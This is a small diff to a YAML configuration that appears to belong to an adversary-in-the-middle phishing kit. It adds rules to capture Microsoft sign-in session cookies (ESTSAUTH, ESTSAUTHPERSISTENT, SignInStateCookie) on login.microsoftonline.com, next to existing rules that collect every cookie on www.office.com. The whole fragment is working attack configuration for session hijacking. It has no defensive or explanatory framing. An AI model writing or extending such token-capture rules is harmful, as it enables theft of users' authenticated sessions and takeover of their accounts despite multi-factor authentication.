@@ -31,6 +31,10 @@ auth_tokens:
     keys: ['.*: regexp']
   - domain: 'www.office.com'
     keys: ['.*: regexp']
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie']
 
 auth urls:
   - '/landingv2'
